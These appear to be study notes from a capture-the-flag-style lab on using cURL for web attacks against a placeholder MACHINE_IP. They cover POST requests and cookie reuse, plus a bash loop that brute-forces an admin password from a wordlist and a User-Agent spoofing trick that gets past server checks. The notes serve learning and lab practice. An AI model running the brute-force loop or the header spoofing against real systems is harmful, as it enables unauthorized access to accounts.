# Day 24 (Exploitation with cURL)

* In the absence of a browser, you can still speak HTTP directly from the command line. The simplest way is with cURL.

* curl is a command-line tool for crafting HTTP requests and viewing raw responses. It's ideal when you need precision or when GUI tools aren't available.

* Because this is a terminal, instead of rendering the webpage, what you'll see is the text representation of the page in HTML.
    -X POST tells cURL to use the POST method.
    -d defines the data we're sending in the body of the request.
    The data will be sent in URL-encoded format, which is the same as what HTML forms use.
    
* To view exactly what the server returns (including headers and potential redirects), add the -i flag.

* If the site responds with a Set-Cookie header, that's a good sign, it means you've successfully logged in or at least triggered a session.

* Using Cookies and Sessions:
    1. save the cookies:
```sh
curl -c cookies.txt -d "username=admin&password=admin" http://MACHINE_IP/session.php
# -c: writes any cookies received from the server into a file (cookies.txt in this case).
```
2. reuse the saved cookies:
```sh
curl -b cookies.txt http://MACHINE_IP/session.php
# -b: tells cURL to send the saved cookies in the next request
```

* Automating Login and Performing Brute Force Using cURL:
    - This exact method underpins tools like Hydra, Burp Intruder, and WFuzz.
```sh
# loop.sh
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://MACHINE_IP/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
# -s: sends the login request silently (no progress meter).
# grep -q checks if the response contains a success string
```

* Bypassing User-Agent Checks
    - Some applications block cURL by checking the User-Agent header. For example, the server may reject requests with: User-Agent: curl/7.x.x
```sh
curl -A "internalcomputer" http://MACHINE_IP/ua_check.php
# -A: specifies custom user agent
```